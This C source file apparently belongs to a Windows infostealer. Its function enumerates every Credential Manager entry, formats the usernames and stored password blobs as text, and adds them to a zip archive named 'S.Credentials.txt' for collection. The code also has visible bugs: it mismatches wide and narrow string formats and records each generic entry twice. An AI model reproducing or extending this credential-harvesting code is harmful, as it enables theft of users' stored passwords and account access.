#include <windows.h>
#include <wincred.h>
#include <shlwapi.h>
#include "WinCred.h"
#include "Zip.h"

void doCredentials(HZIP hZip, DWORD* dwCountCred) {
	CHAR* credentialsData = (CHAR*)malloc(32767);
	memset(credentialsData, 0, 32767);

	DWORD dwCount = 0;
	PCREDENTIALW *pCredential = NULL;
	if (CredEnumerateW(NULL, 0, &dwCount, &pCredential))
	{
		for (DWORD i = 0; i < dwCount; i++)
		{
			if (NULL != pCredential[i]->TargetName)
			{
				if (CRED_TYPE_GENERIC == pCredential[i]->Type)
				{
					if (NULL != pCredential[i]->UserName && NULL != pCredential[i]->CredentialBlob)
					{
						wnsprintfA(credentialsData + lstrlenA(credentialsData), 32767 - lstrlenA(credentialsData), "%s : %s\r\n", pCredential[i]->UserName, (WCHAR*)pCredential[i]->CredentialBlob);
						*dwCountCred = 1;
					}
					wnsprintfA(credentialsData + lstrlenA(credentialsData), 32767 - lstrlenA(credentialsData), "%s : (null)\r\n", pCredential[i]->UserName);
					*dwCountCred = 1;
				}
				else if (CRED_TYPE_DOMAIN_PASSWORD == pCredential[i]->Type)
				{
					wnsprintfA(credentialsData + lstrlenA(credentialsData), 32767 - lstrlenA(credentialsData), "(null) : %s\r\n", pCredential[i]->UserName);
					*dwCountCred = 1;
				}
			}
		}
		CredFree(pCredential);
	}

	ZipAdd(hZip, L"S.Credentials.txt", credentialsData, lstrlenA(credentialsData));
	free(credentialsData);
}